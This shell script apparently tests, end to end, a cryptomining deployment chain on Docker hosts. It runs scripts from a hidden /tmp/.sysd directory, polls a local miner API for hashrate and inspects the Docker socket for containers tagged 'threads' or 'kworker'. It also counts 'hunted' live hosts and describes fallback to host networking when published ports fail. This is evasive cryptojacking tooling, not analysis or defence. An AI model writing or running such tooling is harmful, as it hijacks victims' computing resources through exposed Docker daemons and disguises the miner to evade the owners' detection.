#!/bin/sh
# throwaway: prove the chain end to end on box1 itself. box1's own container now carries
# threads but its published :47999 is dead (daemon does not forward published ports), so
# it should trip the new "api not reachable" stale reason, roll to the hostnet rung, and
# after that the host's own :47999/2/summary MUST answer with real H/s.
set -u
S=/tmp/.sysd
sh -n "$S/dock.sh" && echo DOCK_SYNTAX_OK || echo DOCK_SYNTAX_FAIL
sh -n "$S/dockhot.sh" && echo HOT_SYNTAX_OK || echo HOT_SYNTAX_FAIL
echo "== api before: [$(curl -sS -m 4 http://127.0.0.1:47999/2/summary 2>/dev/null | head -c 60)]"
setsid sh "$S/dock.sh" > /tmp/_dep6.dock 2>&1 </dev/null &
for i in 1 2 3 4 5 6 7 8 9 10 11 12; do
    sleep 25
    a=$(curl -sS -m 3 http://127.0.0.1:47999/2/summary 2>/dev/null | head -c 120)
    echo "t=$((i*25))s api=[$a]"
    if [ -n "$a" ]; then break; fi
done
echo "== api final: [$(curl -sS -m 4 http://127.0.0.1:47999/2/summary 2>/dev/null | head -c 200)]"
echo "== own container flags:"
curl -sS -m 5 --unix-socket /var/run/docker.sock http://localhost/containers/json?all=0 2>/dev/null | grep -o -e threads -e kworker | sort | uniq -c
echo "== dock run tail:"; tail -8 /tmp/_dep6.dock
echo "== live=$(sort -u -k1,1 "$S/.hunt/dock.live" | wc -l)"
date -u
